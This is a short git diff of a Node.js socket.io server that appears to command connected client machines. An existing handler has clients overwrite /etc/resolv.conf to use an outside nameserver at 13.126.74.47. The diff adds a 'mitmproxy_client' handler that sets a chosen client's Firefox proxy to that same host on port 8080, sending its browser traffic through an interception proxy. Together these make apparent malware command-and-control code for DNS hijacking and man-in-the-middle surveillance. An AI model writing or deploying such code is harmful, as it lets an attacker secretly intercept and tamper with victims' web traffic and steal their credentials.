@@ -47,7 +47,7 @@ io.on('connection', function (socket) {
 
   
 
-  socket.emit('setFFProxy', generateFFProxySettings("localhost", 9333));
+ 
 
   socket.on('CH01', function (data) {
     console.log(data);
@@ -72,6 +72,15 @@ io.on('connection', function (socket) {
 
     if(clientSockets[data.toclient]) {
       clientSockets[data.toclient].emit('cmdWriteFile', { string: "nameserver 13.126.74.47", dest: "/etc/resolv.conf" });
+    }
+
+  });
+
+  socket.on('mitmproxy_client', function(data, cb) { 
+    console.log("RECV mitmproxy_client");
+
+    if(clientSockets[data.toclient]) {
+      clientSockets[data.toclient].emit('setFFProxy', generateFFProxySettings("13.126.74.47", 8080));
     }
     
   });
